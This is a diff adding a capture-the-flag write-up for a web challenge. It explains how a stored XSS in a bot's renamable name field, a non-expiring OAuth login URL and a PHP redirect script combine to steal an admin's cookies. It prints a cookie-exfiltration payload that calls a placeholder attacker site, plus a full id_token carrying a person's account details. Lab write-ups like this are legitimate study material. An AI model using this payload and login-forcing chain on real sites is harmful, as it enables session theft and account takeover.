@@ -1,0 +1,81 @@
+Joey : CTF{h1-j03-c4n-1-h4v3-4-c00k13-plz!?!}
+
+It was a fun and interesting challenge.
+
+Write Up:
+
+
+Phase 1 : Creating The Payload
+------------------------------
+
+We have to make sure payload does not involve any user interaction to trigger XSS so that we could steal cookies of admin to get the flag
+
+Steps :
+
+- First create a payload that would send the cookies from the browser once gets executed 
+- For example : <img src=x onerror=location.href='//yourwebsite/script.php?cookies='+document.cookie>
+- Above payload would send cookies to : https://yourwebsite/script.php?cookies=COOKIES_WILL_BE_HERE
+
+
+Phase 2 : Injecting Payload
+---------------------------
+
+On the home page , the name of bot (joe by default) is not properly filtered hence by changing name of bot to our payload we can executed our payload
+
+Steps:
+
+- Go to home page of Joe bot : https://joe.web.ctfcompetition.com/ and login to your account 
+- Now we have to rename Joe bot name to "<img src=x onerror=location.href='//yourwebsite/script.php?cookies='+document.cookie>" (our payload )
+- * Type "let me rename you"
+- * Then solve the captcha and send our payload
+- After renaming we need to logout by : https://joe.web.ctfcompetition.com/logout
+- Now again we are on home page, now simply click on login and login to your account again
+- That's it once we are logged in we can see that our payload is being rendered by the browser
+
+
+Phase 3 : Making Payload Work In Admin Browser
+----------------------------------------------
+
+Our goal is to steal the cookies of admin hence we need to find a way to make our payload work in the admin's browser
+
+Steps:
+
+- We can access the payload injected page from our browser because we are logged in and valid cookies are present in our browser
+- But if we directly sent the URL then it won't wonk because there are no valid cookies related to our account in admin's browser
+- Hence we need to use a proxy and notice how login process is being done in background
+- So in background when we click login link the first request initiated is :
+
+https://accounts.google.com/o/oauth2/v2/auth?scope=profile&state=0.103454376049&redirect_uri=https%3A%2F%2Fjoe.web.ctfcompetition.com%2Flogin&response_type=code&client_id=284940370925-cn4ifefuk33kn0b887pppv5fjb91e8q7.apps.googleusercontent.com
+
+- It looks like a typical Oauth request , it is just asking the google for the token in order to verify the user authenticity
+- Once user is authenticated with google , google redirects user to below URL with valid token (code=CODE_HERE)
+
+https://joe.web.ctfcompetition.com/login?state=0.103454376049&code=4/KfUiBK6w4OZitYXmMpOmVGwZ6LYqLJEIQdjTAOd2nQY
+
+- Now this request redirects us to below URL :
+
+https://joe.web.ctfcompetition.com/login?id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjUyM2Y1OWMyOTY3ZGQyZTI4Mjk3YTU3NGM0ZmEwZjRiZTdlNDdlMDYifQ.eyJhenAiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMDM2NzA0MzgxMTYxNjkxMTE0OTMiLCJhdF9oYXNoIjoiUHhPNVdZQVpQQ3U0eXhfX29vM2J1QSIsImlzcyI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbSIsImlhdCI6MTQ5NzcyODE4NCwiZXhwIjoxNDk3NzMxNzg0LCJuYW1lIjoiUmFrZXNoIE1hbmUiLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tLy1YZFhLWmRPYkN3QS9BQUFBQUFBQUFBSS9BQUFBQUFBQUFTcy9oY09yRnhXNGtyUS9zOTYtYy9waG90by5qcGciLCJnaXZlbl9uYW1lIjoiUmFrZXNoIiwiZmFtaWx5X25hbWUiOiJNYW5lIiwibG9jYWxlIjoiZW4ifQ.D8JH0Zpppnc8TKETGstNVhWc8jMzplxOVBef16peIK0gtiSILosbXVJzRME8ncwo1XjZtjU40-lgN5nOFky7YHwLvYWPkTbIQcEFi0MKtux81UfdiYFtxpeDWGDsNP7OYjTQYj6PYA8T_xhfCZbYS5FwsndkRwleEFwMK0gYY58NtdiLdPYYrVNuob89p2WYaIp8-sg9pklvo3LX_9j1Q98oJn6Qvj43zqHOtLg9XGkpjrsBpZTbgVhfXKmiPNddTtywO5gaHIB6vymANBbTBUS2madTZ3ZMk_6dW8B7hfleTmbk37k14LCbpN4tbQQ7b-aSDSgDodF97e4b-2k0Pw
+
+- This is the final URL that let us login into the bot and also note that it does not expire hence we can use it to log in admin in our account
+- As soon as admin log in to our account our injected payload from the home page of bot gets executed and it transfers cookies to our server
+
+
+Phase 4 : Transferring Payload 
+------------------------------
+
+We know that we can make admin visit any URL so lets make him visit our injected page URL , because of SOP policy our injected payload can access admin cookies and send it to server.
+But we can't simply send the above login URL because it's length is large and bot does not accept large URLs hence lets do redirection from our website
+
+Steps:
+
+- Upload a PHP script that would redirect to above URL :
+
+<?php header('location: https://joe.web.ctfcompetition.com/login?id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjUyM2Y1OWMyOTY3ZGQyZTI4Mjk3YTU3NGM0ZmEwZjRiZTdlNDdlMDYifQ.eyJhenAiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJhdWQiOiIyODQ5NDAzNzA5MjUtY240aWZlZnVrMzNrbjBiODg3cHBwdjVmamI5MWU4cTcuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCJzdWIiOiIxMDM2NzA0MzgxMTYxNjkxMTE0OTMiLCJhdF9oYXNoIjoiUHhPNVdZQVpQQ3U0eXhfX29vM2J1QSIsImlzcyI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbSIsImlhdCI6MTQ5NzcyODE4NCwiZXhwIjoxNDk3NzMxNzg0LCJuYW1lIjoiUmFrZXNoIE1hbmUiLCJwaWN0dXJlIjoiaHR0cHM6Ly9saDMuZ29vZ2xldXNlcmNvbnRlbnQuY29tLy1YZFhLWmRPYkN3QS9BQUFBQUFBQUFBSS9BQUFBQUFBQUFTcy9oY09yRnhXNGtyUS9zOTYtYy9waG90by5qcGciLCJnaXZlbl9uYW1lIjoiUmFrZXNoIiwiZmFtaWx5X25hbWUiOiJNYW5lIiwibG9jYWxlIjoiZW4ifQ.D8JH0Zpppnc8TKETGstNVhWc8jMzplxOVBef16peIK0gtiSILosbXVJzRME8ncwo1XjZtjU40-lgN5nOFky7YHwLvYWPkTbIQcEFi0MKtux81UfdiYFtxpeDWGDsNP7OYjTQYj6PYA8T_xhfCZbYS5FwsndkRwleEFwMK0gYY58NtdiLdPYYrVNuob89p2WYaIp8-sg9pklvo3LX_9j1Q98oJn6Qvj43zqHOtLg9XGkpjrsBpZTbgVhfXKmiPNddTtywO5gaHIB6vymANBbTBUS2madTZ3ZMk_6dW8B7hfleTmbk37k14LCbpN4tbQQ7b-aSDSgDodF97e4b-2k0Pw'); ?>
+
+- Now obtain it's URL (https://yoursite.com/red.php)
+- Now type "report bug" in the bot 
+- Now solve the captcha and enter URL of script (https://yoursite.com/red.php)
+
+That's it. After few seconds cookies of admin will be sent to our server at : http://yourwebsite/script.php
+
+Cookies / Flag : CTF{h1-j03-c4n-1-h4v3-4-c00k13-plz!?!}
